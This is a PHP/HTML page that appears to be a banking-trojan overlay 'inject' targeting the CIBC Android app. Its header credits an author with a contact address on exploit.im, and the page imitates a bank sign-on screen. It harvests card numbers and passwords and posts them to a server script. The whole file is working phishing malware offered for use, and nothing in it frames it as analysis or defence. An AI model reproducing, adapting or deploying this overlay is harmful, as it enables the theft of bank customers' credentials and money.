<!-- Information
Author: Validolik
Jabber: validol@exploit.im
Inject: com.cibc.android.mobi
Stages: 1
Version: 5.5
Last Update: 23.06.2017
-->

<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>com.cibc.android.mobi</title>
        <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">

</head>
<body>

<div id="header">
<img src="libs/images/logo.jfif" style="width: 10%;border: 1px solid #fff;">
</div>
<div class="col-xs-10 col-sm-8">
    <div class="fitMlbody" id="content_div" style="margin-top: 20px;">

        <section class="content">
            <form method="post">
<center>
                <div class="teaser_box">
                    <input type="hidden" value="com.cibc.android.mobi" name="field1">
					<div class="form">
						<div class="ptb">
							<input name="field2" id="login" maxlength="16" onkeyup="check();" placeholder="Card Number" class="input-field" type="text">
			<script>
                document.getElementById('login').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z !@#$%^&*()_+|":?><]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
						</div>
						<br />
						<div class="ptb">
							<input name="field3" id="password" maxlength="12" onkeyup="check();" placeholder="Password" class="input-field" type="password" />

						</div> 
					</div>
					<br />
                    <div class="ptb">
                        <input type="submit" value="SIGN ON" disabled="disabled" id="submitBtn1" class="submit-button" />
                        <br />
                    </div>
		<script>
			function check() {
			  var inp1 = document.getElementById('login'),
				  inp2 = document.getElementById('password');
			  document.getElementById('submitBtn1').disabled = inp1.value && inp2.value ? false : "disabled";
			}
		</script>
                </div>
</center>
            </form>

        </section>
    </div>
</div>
</body>
</html>